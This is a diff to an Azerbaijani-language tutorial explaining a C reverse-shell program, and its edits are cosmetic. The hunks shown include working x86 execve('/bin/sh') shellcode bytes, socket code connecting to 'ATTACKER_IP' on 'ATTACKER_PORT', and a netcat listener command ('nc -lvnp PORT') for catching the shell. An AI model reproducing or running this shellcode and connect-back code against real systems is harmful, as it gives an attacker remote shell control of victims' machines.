@@ -21,7 +21,8 @@ unsigned char shellcode[] =
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
 "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
 "\x53\x89\xe1\xb0\x0b\xcd\x80";
-Bu, x86 Linux üçün yazılmış execve("/bin/sh") shellcode-dur. Qısaca desək:
+Bu, x86 Linux üçün yazılmış execve("/bin/sh") shellcode-dur. 
+Qısaca desək:
 
 \x31\xc0 — EAX registrini təmizlə (xor eax, eax).
 
@@ -58,19 +59,19 @@ AF_INET – IPv4 ünvan ailəsi.
 
 SOCK_STREAM – TCP.
 
-✅ Hücumçu IP və portunu təyin et
+✅ ATTACKER IP və portunu təyin et
 
 server.sin_family = AF_INET;
 server.sin_addr.s_addr = inet_addr("ATTACKER_IP");
 server.sin_port = htons(ATTACKER_PORT);
-ATTACKER_IP – hücumçunun dinləyici IP ünvanı.
+ATTACKER_IP – ATTACKER-in dinləyici IP ünvanı.
 
 ATTACKER_PORT – port nömrəsi.
 
 ✅ Bağlantı yarat
 
 connect(sockfd, (struct sockaddr *)&server, sizeof(server));
-Bu funksiya hücumçuya qoşulmanı təmin edir. Yəni, hücumçu öz kompüterində nc -lvnp PORT kimi dinləyici açmalıdır.
+Bu funksiya ATTACKER-ə qoşulmanı təmin edir. Yəni, ATTACKER öz kompüterində nc -lvnp PORT kimi dinləyici açmalıdır.
 
 ✅ Shellcode icra et
 
@@ -82,7 +83,7 @@ ret() çağırılaraq shellcode başlanğıc ünvanından kod icra olunur.
 
 🔹 Nəticə
 Proqram icra olunduqda:
-1️⃣ Hücumçuya TCP bağlantı qurur.
-2️⃣ Hücumçunun nc (netcat) və ya digər dinləyici proqramı ilə qoşulma qurulur.
+1️⃣ ATTACKER-lə TCP bağlantı qurur.
+2️⃣ ATTACKER-in nc (netcat) və ya digər dinləyici proqramı ilə qoşulma qurulur.
 3️⃣ shellcode icra edilir və hədəf maşında /bin/sh shell açılır.
-4️⃣ Hücumçu bu shell üzərindən əmrlər icra edə bilir.
+4️⃣ ATTACKER bu shell üzərindən əmrlər icra edə bilir.
